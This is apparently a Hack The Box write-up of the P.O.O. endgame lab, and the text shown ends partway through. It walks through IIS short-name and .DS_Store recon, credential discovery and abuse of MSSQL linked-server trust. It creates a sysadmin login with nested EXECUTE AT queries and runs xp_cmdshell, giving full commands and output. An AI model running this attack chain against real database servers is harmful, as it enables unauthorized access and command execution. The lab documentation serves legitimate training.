---
layout: single
title: P.O.O. - Hack The Box
excerpt: "Professional Offensive Operations (P.O.O.) was the first endgame lab released by Hack The Box. It contained five different flags spread across two Windows machines. The initial part required some tricky recon with ds_store and IIS short names to find a MSSQL DB connection string. We then had to pivot by abusing the trust between MSSQL linked servers. The lab also had kerberoasting, password cracking, mimikatz and attack path enumeration with Bloodhound in it."
date: 2020-06-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-poo/poo_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - endgame
  - ds_store
  - iis shortname
  - fuzzing
  - mssql
  - linked servers
  - ipv6
  - mssql python
  - hashcat
  - kerberoast
  - bloodhound
  - mimikatz
---

![](/assets/images/htb-writeup-poo/poo_logo.png)

Professional Offensive Operations (P.O.O.) was the first endgame lab released by Hack The Box. It contained five different flags spread across two Windows machines. The initial part required some tricky recon with ds_store and IIS short names to find a MSSQL DB connection string. We then had to pivot by abusing the trust between MSSQL linked servers. The lab also had kerberoasting, password cracking, mimikatz and attack path enumeration with Bloodhound. The writeup is a somewhat rough compilation of my notes when I initially did it so some stuff might have changed a little bit since it was first released.

## Portscan

```
root@kali:~/hackthebox# nmap -F -sC -sV 10.13.38.11

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-02 21:53 EDT
Nmap scan report for 10.13.38.11
Host is up (0.099s latency).
Not shown: 98 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Professional Offensive Operations
1433/tcp open  ms-sql-s Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info: 
|   Target_Name: POO
|   NetBIOS_Domain_Name: POO
|   NetBIOS_Computer_Name: COMPATIBILITY
|   DNS_Domain_Name: intranet.poo
|   DNS_Computer_Name: COMPATIBILITY.intranet.poo
|   DNS_Tree_Name: intranet.poo
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2018-04-02T16:10:49
|_Not valid after:  2048-04-02T16:10:49
|_ssl-date: 2018-04-03T01:54:00+00:00; -4s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4s, deviation: 0s, median: -4s
| ms-sql-info: 
|   10.13.38.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.78 seconds
```

## Dirbusting

```
root@kali:~# gobuster -u 10.13.38.11 -w SecLists/Discovery/Web_Content/raft-large-directories-lowercase.txt -t 50 -s 200,204,301,302,401

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.13.38.11/
[+] Threads      : 50
[+] Wordlist     : SecLists/Discovery/Web_Content/raft-large-directories-lowercase.txt
[+] Status codes : 302,401,200,204,301
=====================================================
/images (Status: 301)
/admin (Status: 401)
/templates (Status: 301)
/js (Status: 301)
/themes (Status: 301)
/plugins (Status: 301)
/uploads (Status: 301)
/dev (Status: 301)
/widgets (Status: 301)
/meta-inf (Status: 301)
/new folder (Status: 301)
=====================================================
```

There's an `/admin` page... but I can't brute force it though...

## .DS_Store enumeration

After trying a couple of wordlists I found a .ds_store file. The `.ds_store` files left in the directories can help us determine the directory structure of the website such as finding a few hidden directories that we couldn't find with the gobuster wordlists.

Tool used: [https://github.com/lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp)

```
root@kali:~/ds_store_exp# python ds_store_exp.py http://10.13.38.11/.DS_Store
[+] http://10.13.38.11/.DS_Store
[+] http://10.13.38.11/Widgets/.DS_Store
[+] http://10.13.38.11/dev/.DS_Store
[Folder Found] http://10.13.38.11/Templates
[Folder Found] http://10.13.38.11/Widgets
[+] http://10.13.38.11/JS/.DS_Store
[+] http://10.13.38.11/Themes/.DS_Store
[Folder Found] http://10.13.38.11/dev
[Folder Found] http://10.13.38.11/JS
[Folder Found] http://10.13.38.11/Themes
[+] http://10.13.38.11/Images/.DS_Store
[Folder Found] http://10.13.38.11/Uploads
[Folder Found] http://10.13.38.11/Plugins
[+] http://10.13.38.11/iisstart.htm
[Folder Found] http://10.13.38.11/Images
[Folder Found] http://10.13.38.11/META-INF
[+] http://10.13.38.11/Widgets/Framework/.DS_Store
[Folder Found] http://10.13.38.11/Widgets/Menu
[+] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/.DS_Store
[Folder Found] http://10.13.38.11/Widgets/Framework
[+] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/.DS_Store
[Folder Found] http://10.13.38.11/Widgets/Notifications
[Folder Found] http://10.13.38.11/Widgets/CalendarEvents
[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
[Folder Found] http://10.13.38.11/JS/custom
[Folder Found] http://10.13.38.11/Themes/default
[+] http://10.13.38.11/Widgets/Framework/Layouts/.DS_Store
[Folder Found] http://10.13.38.11/Images/buttons
[Folder Found] http://10.13.38.11/Images/icons
[Folder Found] http://10.13.38.11/Widgets/Framework/Layouts
[+] http://10.13.38.11/Images/iisstart.png
[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core
[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include
[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src
[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core
[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include
[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
[Folder Found] http://10.13.38.11/Widgets/Framework/Layouts/default
[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src
[Folder Found] http://10.13.38.11/Widgets/Framework/Layouts/custom
```

The /dev directories are hashes of the box creator names:

- `dca66d38fd916317687e1390a420c3fc -> eks`
- `304c0c90fbc6520610abbf378e2339d1 -> mrb3n`

The `/core`, `/src`, `/include`, and `/db` directories under `/dev/304c0c90fbc6520610abbf378e2339d1` look interesting but after enumeration we didn't find anything using gobuster.

## IIS short name enumeration

Because this is a Windows server it supports shortnames for backward compatibility with DOS. We can scan for those files and even though we can't read them using the 8.3 name it'll give us the first few letters of the filename and we can guess/fuzz the rest.

Tool used: [https://github.com/lijiejie/IIS_shortname_Scanner](https://github.com/lijiejie/IIS_shortname_Scanner)

```
root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11
Server is vulnerable, please wait, scanning...
[+] /a~1.*	[scan in progress]
[+] /d~1.*	[scan in progress]
[+] /n~1.*	[scan in progress]
[+] /t~1.*	[scan in progress]
[+] /p~1.*	[scan in progress]
[+] /s~1.*	[scan in progress]
[+] /w~1.*	[scan in progress]
[+] /ds~1.*	[scan in progress]
[+] /ar~1.*	[scan in progress]
[+] /ne~1.*	[scan in progress]
[+] /te~1.*	[scan in progress]
[+] /tr~1.*	[scan in progress]
[+] /tu~1.*	[scan in progress]
[+] /pu~1.*	[scan in progress]
[+] /sn~1.*	[scan in progress]
[+] /we~1.*	[scan in progress]
[+] /ds_~1.*	[scan in progress]
[+] /ark~1.*	[scan in progress]
[+] /new~1.*	[scan in progress]
[+] /tem~1.*	[scan in progress]
[+] /tra~1.*	[scan in progress]
[+] /pup~1.*	[scan in progress]
[+] /tun~1.*	[scan in progress]
[+] /sna~1.*	[scan in progress]
[+] /web~1.*	[scan in progress]
[+] /ds_s~1.*	[scan in progress]
[+] /arka~1.*	[scan in progress]
[+] /newf~1.*	[scan in progress]
[+] /temp~1.*	[scan in progress]
[+] /tras~1.*	[scan in progress]
[+] /pupp~1.*	[scan in progress]
[+] /tunn~1.*	[scan in progress]
[+] /snad~1.*	[scan in progress]
[+] /ds_st~1.*	[scan in progress]
[+] /arkan~1.*	[scan in progress]
[+] /newfo~1.*	[scan in progress]
[+] /templ~1.*	[scan in progress]
[+] /trash~1.*	[scan in progress]
[+] /puppa~1.*	[scan in progress]
[+] /tunne~1.*	[scan in progress]
[+] /snado~1.*	[scan in progress]
[+] /ds_sto~1.*	[scan in progress]
[+] /arkant~1.*	[scan in progress]
[+] /templa~1.*	[scan in progress]
[+] /trashe~1.*	[scan in progress]
[+] /newfol~1.*	[scan in progress]
[+] /puppa2~1.*	[scan in progress]
[+] /tunnel~1.*	[scan in progress]
[+] /ds_sto~1	[scan in progress]
[+] Directory /ds_sto~1	[Done]
[+] /arkant~1.a*	[scan in progress]
[+] /snado_~1.*	[scan in progress]
[+] /templa~1	[scan in progress]
[+] Directory /templa~1	[Done]
[+] /trashe~1	[scan in progress]
[+] Directory /trashe~1	[Done]
[+] /newfol~1	[scan in progress]
[+] Directory /newfol~1	[Done]
[+] /puppa2~1.a*	[scan in progress]
[+] /tunnel~1.a*	[scan in progress]
[+] /arkant~1.as*	[scan in progress]
[+] /snado_~1.t*	[scan in progress]
[+] /puppa2~1.as*	[scan in progress]
[+] /tunnel~1.as*	[scan in progress]
[+] /arkant~1.asp*	[scan in progress]
[+] File /arkant~1.asp*	[Done]
[+] /snado_~1.tx*	[scan in progress]
[+] /puppa2~1.asp*	[scan in progress]
[+] File /puppa2~1.asp*	[Done]
[+] /tunnel~1.ash*	[scan in progress]
[+] File /tunnel~1.ash*	[Done]
[+] /tunnel~1.asp*	[scan in progress]
[+] File /tunnel~1.asp*	[Done]
[+] /snado_~1.txt*	[scan in progress]
[+] File /snado_~1.txt*	[Done]
----------------------------------------------------------------
Dir:  /ds_sto~1
Dir:  /templa~1
Dir:  /trashe~1
Dir:  /newfol~1
File: /arkant~1.asp*
File: /puppa2~1.asp*
File: /tunnel~1.ash*
File: /tunnel~1.asp*
File: /snado_~1.txt*
----------------------------------------------------------------
4 Directories, 5 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

Nothing interesting in the main directory. The .asp files are leftover from other teams.

Let's check those folders we found with the ds_store scanner:

```
root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/p~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/d~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/pu~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/pup~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/pupp~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_s~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/puppa~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_st~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1	[scan in progress]
[+] Directory /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1	[Done]
----------------------------------------------------------------
Dir:  /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1
----------------------------------------------------------------
1 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1
Server is vulnerable, please wait, scanning...
[+] /dev/304c0c90fbc6520610abbf378e2339d1/d~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_s~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_st~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1	[scan in progress]
[+] Directory /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1	[Done]
----------------------------------------------------------------
Dir:  /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1
----------------------------------------------------------------
1 Directories, 0 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

```
root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db
Server is vulnerable, please wait, scanning...
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/p~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/po~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_c~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.t*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.tx*	[scan in progress]
[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*	[scan in progress]
[+] File /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*	[Done]
----------------------------------------------------------------
File: /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.

root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db
Server is vulnerable, please wait, scanning...
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*	[scan in progress]
[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*	[scan in progress]
[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*	[Done]
----------------------------------------------------------------
File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*
----------------------------------------------------------------
0 Directories, 1 Files found in total
Note that * is a wildcard, matches any character zero or more times.
```

We found a file that starts with `poo_co`, but we need to get the rest of the filename using some fuzzing.

We'll take the english dictionary and keep only the words that start with `co`, then use wfuzz to scan the directory:

```
root@kali:~/SecLists# egrep "^co" words.txt > ../co.txt
root@kali:~/SecLists# cd ..
root@kali:~# wfuzz -z file,co.txt --hc 404 http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txt
```

Success! There's a file called `poo_connection.txt` in the folder containg our first flag and MSSQL credentials:

```
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3c...}
```

First flag: `POO{fcfb0767f5bd3c...}`

## MSSQL enumeration

There's no CVE on this server, it's running the latest patched MSSQL.

```
msf auxiliary(admin/mssql/mssql_enum) > run

[*] 10.13.38.11:1433 - Running MS SQL Server Enumeration...
[*] 10.13.38.11:1433 - Version:
[*]	Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
[*]		Aug 22 2017 17:04:49 
[*]		Copyright (C) 2017 Microsoft Corporation
[*]		Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
[*] 10.13.38.11:1433 - Configuration Parameters:
[*] 10.13.38.11:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.13.38.11:1433 - 	xp_cmdshell is Enabled
[*] 10.13.38.11:1433 - 	remote access is Enabled
[*] 10.13.38.11:1433 - 	allow updates is Not Enabled
[*] 10.13.38.11:1433 - 	Database Mail XPs is Not Enabled
[*] 10.13.38.11:1433 - 	Ole Automation Procedures are Enabled
[*] 10.13.38.11:1433 - Databases on the server:
[*] 10.13.38.11:1433 - 	Database name:master
[*] 10.13.38.11:1433 - 	Database Files for master:
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\master.mdf
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\mastlog.ldf
[*] 10.13.38.11:1433 - 	Database name:tempdb
[*] 10.13.38.11:1433 - 	Database Files for tempdb:
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\tempdb.mdf
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\templog.ldf
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\tempdb_mssql_2.ndf
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\tempdb_mssql_3.ndf
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\tempdb_mssql_4.ndf
[*] 10.13.38.11:1433 - 	Database name:POO_PUBLIC
[*] 10.13.38.11:1433 - 	Database Files for POO_PUBLIC:
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\poo_public_dat.mdf
[*] 10.13.38.11:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL14.POO_PUBLIC\MSSQL\DATA\poo_public_log.ldf
[*] 10.13.38.11:1433 - System Logins on this Server:
[*] 10.13.38.11:1433 - 	sa
[*] 10.13.38.11:1433 - 	external_user
[*] 10.13.38.11:1433 - Disabled Accounts:
[*] 10.13.38.11:1433 - 	No Disabled Logins Found
[*] 10.13.38.11:1433 - No Accounts Policy is set for:
[*] 10.13.38.11:1433 - 	All System Accounts have the Windows Account Policy Applied to them.
[*] 10.13.38.11:1433 - Password Expiration is not checked for:
[*] 10.13.38.11:1433 - 	sa
[*] 10.13.38.11:1433 - 	external_user
[*] 10.13.38.11:1433 - System Admin Logins on this Server:
[*] 10.13.38.11:1433 - 	sa
[*] 10.13.38.11:1433 - Windows Logins on this Server:
[*] 10.13.38.11:1433 - 	No Windows logins found!
[*] 10.13.38.11:1433 - Windows Groups that can logins on this Server:
[*] 10.13.38.11:1433 - 	No Windows Groups where found with permission to login to system.
[*] 10.13.38.11:1433 - Accounts with Username and Password being the same:
[*] 10.13.38.11:1433 - 	No Account with its password being the same as its username was found.
[*] 10.13.38.11:1433 - Accounts with empty password:
[*] 10.13.38.11:1433 - 	No Accounts with empty passwords where found.
[*] 10.13.38.11:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.13.38.11:1433 - 	sp_replsetsyncstatus
[*] 10.13.38.11:1433 - 	sp_replcounters
[*] 10.13.38.11:1433 - 	sp_replsendtoqueue
[*] 10.13.38.11:1433 - 	sp_resyncexecutesql
[*] 10.13.38.11:1433 - 	sp_prepexecrpc
[*] 10.13.38.11:1433 - 	sp_repltrans
[*] 10.13.38.11:1433 - 	sp_xml_preparedocument
[*] 10.13.38.11:1433 - 	xp_qv
[*] 10.13.38.11:1433 - 	xp_getnetname
[*] 10.13.38.11:1433 - 	sp_releaseschemalock
[*] 10.13.38.11:1433 - 	sp_refreshview
[*] 10.13.38.11:1433 - 	sp_replcmds
[*] 10.13.38.11:1433 - 	sp_unprepare
[*] 10.13.38.11:1433 - 	sp_resyncprepare
[*] 10.13.38.11:1433 - 	sp_createorphan
[*] 10.13.38.11:1433 - 	xp_dirtree
[*] 10.13.38.11:1433 - 	sp_replwritetovarbin
[*] 10.13.38.11:1433 - 	sp_replsetoriginator
[*] 10.13.38.11:1433 - 	sp_xml_removedocument
[*] 10.13.38.11:1433 - 	sp_repldone
[*] 10.13.38.11:1433 - 	sp_reset_connection
[*] 10.13.38.11:1433 - 	xp_fileexist
[*] 10.13.38.11:1433 - 	xp_fixeddrives
[*] 10.13.38.11:1433 - 	sp_getschemalock
[*] 10.13.38.11:1433 - 	sp_prepexec
[*] 10.13.38.11:1433 - 	xp_revokelogin
[*] 10.13.38.11:1433 - 	sp_execute_external_script
[*] 10.13.38.11:1433 - 	sp_resyncuniquetable
[*] 10.13.38.11:1433 - 	sp_replflush
[*] 10.13.38.11:1433 - 	sp_resyncexecute
[*] 10.13.38.11:1433 - 	xp_grantlogin
[*] 10.13.38.11:1433 - 	sp_droporphans
[*] 10.13.38.11:1433 - 	xp_regread
[*] 10.13.38.11:1433 - 	sp_getbindtoken
[*] 10.13.38.11:1433 - 	sp_replincrementlsn
[*] 10.13.38.11:1433 - Instances found on this server:
[*] 10.13.38.11:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.13.38.11:1433 - 	xp_regread might be disabled in this system
[*] Auxiliary module execution completed
```

## PowerUpSQL and MSSQL linked servers

For the next parts, we'll use a Windows 10 machine.

![MSSQL login](/assets/images/htb-writeup-poo/Screenshot_1.png)

Since our local attacker machine is not domain joined and we don't have access to the domain controller, we'll define the instance manually and test the credentials:

```
PS C:\Users\snowscan> $user = "external_user"
PS C:\Users\snowscan> $pass = "#p00Public3xt3rnalUs3r#"
PS C:\Users\snowscan> $i = "10.13.38.11,1433"
PS C:\Users\snowscan> get-sqlservercredential -verbose -instance $i -username $user -password $pass
VERBOSE: 10.13.38.11,1433 : Connection Success.
```

Next, we start auditing the configuration for weak permissions and such. We find that there is a linked server which we can access.

```
PS C:\Users\snowscan> Invoke-SQLAuditPrivServerLink -verbose -instance $i -username $user -password $pass
VERBOSE: 10.13.38.11,1433 : START VULNERABILITY CHECK: Excessive Privilege - Server Link
VERBOSE: 10.13.38.11,1433 : CONNECTION SUCCESS.
VERBOSE: 10.13.38.11,1433 : - The COMPATIBILITY\POO_CONFIG linked server was found configured with the internal_user login.
VERBOSE: 10.13.38.11,1433 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server Link


ComputerName  : 10.13.38.11
Instance      : 10.13.38.11,1433
Vulnerability : Excessive Privilege - Linked Server
Description   : One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a
                remote server.
Remediation   : Configure SQL Server links to connect to remote servers using the login's current security context.
Severity      : Medium
IsVulnerable  : Yes
IsExploitable : No
Exploited     : No
ExploitCmd    : Example query: SELECT * FROM OPENQUERY([COMPATIBILITY\POO_CONFIG],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')
Details       : The SQL Server link COMPATIBILITY\POO_CONFIG was found configured with the internal_user login.
Reference     : https://msdn.microsoft.com/en-us/library/ms190479.aspx
Author        : Scott Sutherland (@_nullbind), NetSPI 2016
```

Let's explore this further:

```
PS C:\Users\snowscan> get-sqlserverlink -verbose -instance $i -username $user -password $pass
VERBOSE: 10.13.38.11,1433 : Connection Success.


ComputerName           : 10.13.38.11
Instance               : 10.13.38.11,1433
DatabaseLinkId         : 0
DatabaseLinkName       : COMPATIBILITY\POO_PUBLIC
DatabaseLinkLocation   : Local
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             : Uses Self Credentials
RemoteLoginName        :
is_rpc_out_enabled     : True
is_data_access_enabled : False
modify_date            : 3/17/2018 1:21:26 PM

ComputerName           : 10.13.38.11
Instance               : 10.13.38.11,1433
DatabaseLinkId         : 1
DatabaseLinkName       : COMPATIBILITY\POO_CONFIG
DatabaseLinkLocation   : Remote
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        : internal_user
is_rpc_out_enabled     : True
is_data_access_enabled : True
modify_date            : 3/17/2018 1:51:08 PM
```

So using our `external_user`, we can execute commands as `internal_user` on the other DB instance `POO_CONFIG`.

The following blog has an interesting technique to exploit trust in linked servers: [http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html](http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html)

So, `COMPATIBILITY\POO_PUBLIC` and `COMPATIBILITY\POO_CONFIG` are both linked.

We can see this using: `select * from master..sysservers`

```
PS C:\Users\snowscan> get-sqlquery -instance $i -username $user -password $pass -query "select * from master..sysservers"


srvid                : 0
srvstatus            : 1089
srvname              : COMPATIBILITY\POO_PUBLIC
srvproduct           : SQL Server
providername         : SQLOLEDB
datasource           : COMPATIBILITY\POO_PUBLIC
location             :
providerstring       :
schemadate           : 3/17/2018 1:21:26 PM
topologyx            : 0
topologyy            : 0
catalog              :
srvcollation         :
connecttimeout       : 0
querytimeout         : 0
srvnetname           : COMPATIBILITY\POO_PUBLIC
isremote             : True
rpc                  : True
pub                  : False
sub                  : False
dist                 : False
dpub                 : False
rpcout               : True
dataaccess           : False
collationcompatible  : False
system               : False
useremotecollation   : True
lazyschemavalidation : False
collation            :
nonsqlsub            : False

srvid                : 1
srvstatus            : 1249
srvname              : COMPATIBILITY\POO_CONFIG
srvproduct           : SQL Server
providername         : SQLOLEDB
datasource           : COMPATIBILITY\POO_CONFIG
location             :
providerstring       :
schemadate           : 3/17/2018 1:51:08 PM
topologyx            : 0
topologyy            : 0
catalog              :
srvcollation         :
connecttimeout       : 0
querytimeout         : 0
srvnetname           : COMPATIBILITY\POO_CONFIG
isremote             : False
rpc                  : True
pub                  : False
sub                  : False
dist                 : False
dpub                 : False
rpcout               : True
dataaccess           : True
collationcompatible  : False
system               : False
useremotecollation   : True
lazyschemavalidation : False
collation            :
nonsqlsub            : False
```

For the next parts, we'll use the SQL Server Management Studio client because the quotes escaping in Powershell messes up our OPENQUERY commands and it'll be easier to work with.

We can enumerate the list of databases from `POO_CONFIG` but there is nothing interesting.

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_2.png)

`select * from openquery("COMPATIBILITY\POO_CONFIG",'SELECT * FROM master.dbo.sysdatabases')`

```
master	1	0x01
tempdb	2	0x01
POO_CONFIG	5	0x4E6C9A727878684DA065E7C29005704D
```
Let's double check manually what PowerUpSQL has given us regarding `internal_user` and check if this user has `sysadmin` privileges:

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_4.png)

Unfortunately, we don't have `sysadmin` on `POO_CONFIG`

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_5.png)

Now, if we use OPENQUERY from `POO_CONFIG` back to `POO_PUBLIC` we get interesting results.

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_6.png)

Sweet! We are running queries on `POO_PUBLIC` as user `sa` if we pass them through `POO_CONFIG`!

We can use an openquery to find a previsouly hidden database (from our external_user) on `COMPATIBILITY\POO_PUBLIC`

`select * from openquery("COMPATIBILITY\POO_CONFIG",'select * from openquery("COMPATIBILITY\POO_PUBLIC",''SELECT * FROM flag.dbo.flag'')')`

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_7.png)

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_8.png)

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_9.png)

We found a flag in flag.dbo.flag: `POO{88d829eb39f2d1...}`

### MSSQL RCE

Next, we can create ourselves a user on `COMPATIBILITY\POO_PUBLIC` with `sysadmin` privileges so we don't need to go through linked servers again.

`EXECUTE('EXECUTE(''EXEC master..sp_addlogin ''''booya'''', ''''0wned123!'''''') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG"`

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_10.png)

And then add it the `sysadmin` privileges:

`EXECUTE('EXECUTE(''EXEC master..sp_addsrvrolemember ''''booya'''', ''''sysadmin'''''') AT "COMPATIBILITY\POO_PUBLIC"') AT "COMPATIBILITY\POO_CONFIG"`

![MSSQL](/assets/images/htb-writeup-poo/Screenshot_11.png)

Now that we have `sysadmin` privileges, we can execute commands using `xp_cmdshell`:

```
PS C:\Users\snowscan> $user = "booya"
PS C:\Users\snowscan> $pass = "0wned123!"
PS C:\Users\snowscan> get-sqlquery -verbose -instance $i -username $user -password $pass -query "xp_cmdshell 'whoami'"
VERBOSE: 10.13.38.11,1433 : Connection Success.

output
------
nt service\mssql$poo_public
```

Even though we have `sysadmin` access in the database, we only a limited OS access with `nt service\mssql$poo_public`

We don't have outbound IPv4 connectivity, the General Failure error message probably means there's no IPv4 address on the interface:

```
PS C:\Users\snowscan> get-sqlquery -verbose -instance $i -username $user -password $pass -query "xp_cmdshell 'ping 10.14.14.7'"
VERBOSE: 10.13.38.11,1433 : Connection Success.

output
------

